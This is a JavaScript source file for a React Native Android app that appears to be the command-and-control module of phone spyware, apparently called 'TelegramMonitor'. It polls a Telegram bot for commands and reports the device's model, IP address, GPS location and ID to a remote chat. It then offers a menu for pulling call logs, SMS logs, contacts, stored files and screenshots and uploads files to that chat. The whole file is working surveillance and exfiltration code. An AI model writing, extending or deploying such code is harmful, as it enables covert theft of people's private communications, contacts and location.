/**
 * Telegram Bot API interface
 * Handles communication with the Telegram Bot API
 */
import axios from 'axios';
import { Platform } from 'react-native';
import logger from '../utils/logger';
import { encrypt } from '../utils/encryption';

// Create axios instance for Telegram API
const createTelegramAPI = (token) => {
  if (!token) {
    return null;
  }
  
  const api = axios.create({
    baseURL: `https://api.telegram.org/bot${token}`,
    timeout: 15000, // Increased timeout for better reliability
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': `TelegramMonitor/${Platform.OS}/${Platform.Version}`
    }
  });
  
  // Add response interceptor for error handling with retry logic
  api.interceptors.response.use(
    response => response,
    async error => {
      const errorMessage = error.response?.data?.description || error.message;
      const status = error.response?.status;
      const config = error.config;
      
      // Check if we need to retry the request
      if (!config || !config.retry) {
        logger.error(`Telegram API error: ${errorMessage}`);
        return Promise.reject(error);
      }
      
      // If it's a network error, or 5xx server error, or 429 too many requests
      if (!status || status >= 500 || status === 429) {
        // Decrement retry count
        config._retryCount = config._retryCount || 0;
        if (config._retryCount < config.retry) {
          config._retryCount += 1;
          
          // Calculated delay with exponential backoff
          const delay = Math.pow(2, config._retryCount) * 1000;
          logger.warning(`Retrying Telegram API request (${config._retryCount}/${config.retry}) after ${delay}ms`);
          
          // Wait for the specified delay
          await new Promise(resolve => setTimeout(resolve, delay));
          
          // Retry the request
          return api(config);
        }
      }
      
      logger.error(`Telegram API error after retries: ${errorMessage}`);
      return Promise.reject(error);
    }
  );
  
  // Add request interceptor to set retry config
  api.interceptors.request.use(
    config => {
      config.retry = 3; // Number of retries for failed requests
      return config;
    },
    error => Promise.reject(error)
  );
  
  return api;
};

/**
 * Telegram API class
 */
class TelegramAPI {
  constructor() {
    this.api = null;
    this.token = null;
    this.chatId = null;
    this.lastUpdateId = 0;
    this.connected = false;
    this.connectionListeners = [];
    this.commandHandlers = {};
    this.reconnectTimer = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 10;
    this.updatePollingInterval = null;
    this.isPolling = false;
  }
  
  /**
   * Initialize the API with token and chat ID
   * @param {string} token - Telegram bot token
   * @param {string} chatId - Telegram chat ID
   */
  initialize(token, chatId) {
    this.token = token;
    this.chatId = chatId;
    this.api = createTelegramAPI(token);
    
    if (this.api && this.chatId) {
      this.setConnected(true);
      this.startUpdatePolling();
      // Test connection with a simple getMe request
      this.testConnection();
    } else {
      this.setConnected(false);
    }
    
    return this.connected;
  }
  
  /**
   * Test the connection to Telegram API
   */
  async testConnection() {
    try {
      const response = await this.api.get('/getMe');
      const botInfo = response.data.result;
      if (botInfo && botInfo.id) {
        logger.success(`Connected to Telegram bot: ${botInfo.username}`);
        this.reconnectAttempts = 0; // Reset reconnect attempts on successful connection
        return true;
      }
      return false;
    } catch (error) {
      logger.error(`Failed to connect to Telegram: ${error.message}`);
      this.handleDisconnection();
      return false;
    }
  }
  
  /**
   * Handle disconnection with auto-reconnect
   */
  handleDisconnection() {
    this.setConnected(false);
    this.stopUpdatePolling();
    
    // Clear any existing reconnect timer
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
    }
    
    // Attempt to reconnect with exponential backoff
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      const delay = Math.min(30000, Math.pow(2, this.reconnectAttempts) * 1000);
      logger.warning(`Telegram disconnected. Reconnecting in ${delay / 1000}s (attempt ${this.reconnectAttempts + 1}/${this.maxReconnectAttempts})`);
      
      this.reconnectTimer = setTimeout(() => {
        this.reconnectAttempts++;
        if (this.token && this.chatId) {
          this.api = createTelegramAPI(this.token);
          this.testConnection().then(success => {
            if (success) {
              this.setConnected(true);
              this.startUpdatePolling();
            }
          });
        }
      }, delay);
    } else {
      logger.error(`Failed to reconnect to Telegram after ${this.maxReconnectAttempts} attempts`);
    }
  }
  
  /**
   * Start polling for updates
   */
  startUpdatePolling() {
    if (this.isPolling) return;
    
    this.isPolling = true;
    this.updatePollingInterval = setInterval(async () => {
      if (this.connected) {
        try {
          const updates = await this.getUpdates();
          
          for (const update of updates) {
            await this.processUpdate(update);
          }
        } catch (error) {
          logger.error(`Error in update polling: ${error.message}`);
          // Polling errors shouldn't trigger disconnection directly
          // as the getUpdates method already handles connection errors
        }
      }
    }, 3000); // Poll every 3 seconds
  }
  
  /**
   * Stop polling for updates
   */
  stopUpdatePolling() {
    if (this.updatePollingInterval) {
      clearInterval(this.updatePollingInterval);
      this.updatePollingInterval = null;
    }
    this.isPolling = false;
  }
  
  /**
   * Set connection status and notify listeners
   * @param {boolean} status - Connection status
   */
  setConnected(status) {
    const wasConnected = this.connected;
    this.connected = status;
    
    // Only notify if the status actually changed
    if (wasConnected !== status) {
      logger.info(`Telegram connection status: ${status ? 'Connected' : 'Disconnected'}`);
      this.connectionListeners.forEach(listener => listener(status));
    }
  }
  
  /**
   * Add connection status listener
   * @param {Function} listener - Listener function
   */
  addConnectionListener(listener) {
    if (typeof listener === 'function') {
      this.connectionListeners.push(listener);
      // Immediately call with current status
      listener(this.connected);
    }
  }
  
  /**
   * Remove connection status listener
   * @param {Function} listener - Listener function to remove
   */
  removeConnectionListener(listener) {
    this.connectionListeners = this.connectionListeners.filter(l => l !== listener);
  }
  
  /**
   * Register a command handler
   * @param {string} command - Command name
   * @param {Function} handler - Handler function
   */
  registerCommandHandler(command, handler) {
    if (typeof handler === 'function') {
      this.commandHandlers[command] = handler;
      logger.debug(`Registered command handler: ${command}`);
    }
  }
  
  /**
   * Get updates from Telegram
   * @returns {Promise<Array>} Array of updates
   */
  async getUpdates() {
    if (!this.connected) {
      return [];
    }
    
    try {
      const response = await this.api.get('/getUpdates', {
        params: { 
          offset: this.lastUpdateId + 1,
          timeout: 1,
          allowed_updates: ["message", "callback_query"] // Optimize by limiting types of updates
        }
      });
      
      const updates = response.data.result || [];
      
      if (updates.length > 0) {
        this.lastUpdateId = updates[updates.length - 1].update_id;
      }
      
      return updates;
    } catch (error) {
      logger.error(`Failed to get updates: ${error.message}`);
      this.handleDisconnection();
      return [];
    }
  }
  
  /**
   * Process a single update
   * @param {Object} update - Update object from Telegram
   */
  async processUpdate(update) {
    try {
      // First check if the message is for the correct chat
      // This ensures we only respond to the authorized chat
      if (update.message && update.message.chat.id.toString() !== this.chatId.toString()) {
        logger.warning(`Received message from unauthorized chat: ${update.message.chat.id}`);
        return;
      }
      
      if (update.callback_query && update.callback_query.message.chat.id.toString() !== this.chatId.toString()) {
        logger.warning(`Received callback from unauthorized chat: ${update.callback_query.message.chat.id}`);
        return;
      }
      
      // Handle callback queries (button presses)
      if (update.callback_query) {
        const { id, data } = update.callback_query;
        logger.info(`Received callback query: ${data}`);
        
        // Answer the callback query to remove loading state
        await this.api.post('/answerCallbackQuery', { callback_query_id: id });
        
        // Find and execute the handler for this command
        if (this.commandHandlers[data]) {
          await this.commandHandlers[data](update.callback_query);
        } else if (data.includes('_')) {
          // Handle parameterized commands (e.g., file_123)
          const [command, ...params] = data.split('_');
          if (this.commandHandlers[command]) {
            await this.commandHandlers[command](update.callback_query, params.join('_'));
          } else {
            logger.warning(`No handler for parameterized command: ${command}`);
          }
        } else {
          logger.warning(`No handler for command: ${data}`);
          await this.sendMessage(`Command not implemented: ${data}`);
        }
      }
      
      // Handle message commands
      if (update.message?.text) {
        logger.info(`Received message: ${update.message.text}`);
        
        if (update.message.text.startsWith('/')) {
          // Extract command and parameters
          const fullCommand = update.message.text.substring(1); // Remove leading slash
          const parts = fullCommand.split(' ');
          const command = parts[0].toLowerCase();
          const params = parts.slice(1);
          
          if (this.commandHandlers[command]) {
            logger.debug(`Executing command: ${command} with params: ${params.join(', ')}`);
            await this.commandHandlers[command](update.message, params);
          } else {
            logger.warning(`Unknown command: ${command}`);
            await this.sendMessage(`Unknown command: /${command}\nType /help for available commands.`);
          }
        } else {
          // Handle non-command messages if we have a default message handler
          if (this.commandHandlers['message']) {
            await this.commandHandlers['message'](update.message);
          }
        }
      }
    } catch (error) {
      logger.error(`Error processing update: ${error.message}`);
      // Try to send error message to the user
      try {
        await this.sendMessage(`Error processing command: ${error.message}`);
      } catch (sendError) {
        logger.error(`Failed to send error message: ${sendError.message}`);
      }
    }
  }
  
  /**
   * Send a message to the chat
   * @param {string} text - Message text
   * @param {Object} options - Additional options
   * @returns {Promise}
   */
  async sendMessage(text, options = {}) {
    if (!this.connected) {
      return false;
    }
    
    try {
      await this.api.post('/sendMessage', {
        chat_id: this.chatId,
        text,
        parse_mode: options.parse_mode || 'Markdown',
        reply_markup: options.reply_markup
      });
      return true;
    } catch (error) {
      logger.error(`Failed to send message: ${error.message}`);
      return false;
    }
  }
  
  /**
   * Send a file to the chat
   * @param {string} filePath - Local file path
   * @param {string} caption - File caption
   * @returns {Promise}
   */
  async sendFile(filePath, caption = '') {
    if (!this.connected) {
      return false;
    }
    
    try {
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      
      if (caption) {
        formData.append('caption', caption);
      }
      
      formData.append('document', {
        uri: filePath,
        name: filePath.split('/').pop(),
        type: 'application/octet-stream'
      });
      
      await this.api.post('/sendDocument', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      
      return true;
    } catch (error) {
      logger.error(`Failed to send file: ${error.message}`);
      return false;
    }
  }
  
  /**
   * Send device information
   * @param {Object} deviceInfo - Device information object
   * @returns {Promise}
   */
  async sendDeviceInfo(deviceInfo) {
    if (!this.connected || !deviceInfo) {
      return false;
    }
    
    try {
      const message = `📱 *Device Connected!*\n\n` +
        `• Device: ${deviceInfo.deviceName}\n` +
        `• Model: ${deviceInfo.model}\n` +
        `• OS: Android ${deviceInfo.osVersion}\n` +
        `• Build: ${deviceInfo.osBuild}\n` +
        `• IP: ${deviceInfo.ipAddress}\n` +
        `• Location: ${deviceInfo.location.latitude ? 
          `${deviceInfo.location.latitude.toFixed(4)}, ${deviceInfo.location.longitude.toFixed(4)}` : 'N/A'}\n` +
        `• Uptime: ${deviceInfo.uptime}\n` +
        `• App Version: ${deviceInfo.appVersion}\n` +
        `• Device ID: ${encrypt(deviceInfo.deviceId).substring(0, 16)}`;
      
      await this.sendMessage(message);
      
      // Send command menu
      const keyboard = {
        inline_keyboard: [
          [{ text: '📞 Call Logs', callback_data: 'call_logs' }, 
           { text: '💬 SMS Logs', callback_data: 'sms_logs' }],
          [{ text: '👥 Contacts', callback_data: 'contacts' }, 
           { text: '📁 Storage', callback_data: 'storage' }],
          [{ text: '📊 Device Info', callback_data: 'device_info' }, 
           { text: '📷 Take Screenshot', callback_data: 'screenshot' }]
        ]
      };
      
      await this.sendMessage('Choose an option:', { reply_markup: keyboard });
      return true;
    } catch (error) {
      logger.error(`Failed to send device info: ${error.message}`);
      return false;
    }
  }
}

// Create and export singleton instance
const telegramAPI = new TelegramAPI();
export default telegramAPI;
